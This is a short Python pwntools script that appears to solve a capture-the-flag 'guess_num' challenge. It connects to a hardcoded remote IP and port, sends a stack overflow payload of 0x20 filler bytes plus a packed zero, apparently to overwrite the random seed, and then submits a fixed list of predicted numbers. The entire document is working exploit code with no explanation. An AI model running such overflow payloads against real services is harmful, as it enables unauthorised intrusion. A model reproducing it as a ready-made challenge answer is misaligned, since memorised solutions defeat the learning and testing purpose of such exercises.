from pwn import *
context.log_level='debug'
p=process("./guess_num")
p=remote("111.198.29.45","59596")
p.recvuntil("name:")
payload='a'*0x20+p64(0)
p.sendline(payload)
num=[2,5,4,2,6,2,5,1,4,2]
for i in num:
    p.sendline(str(i))

p.recv()
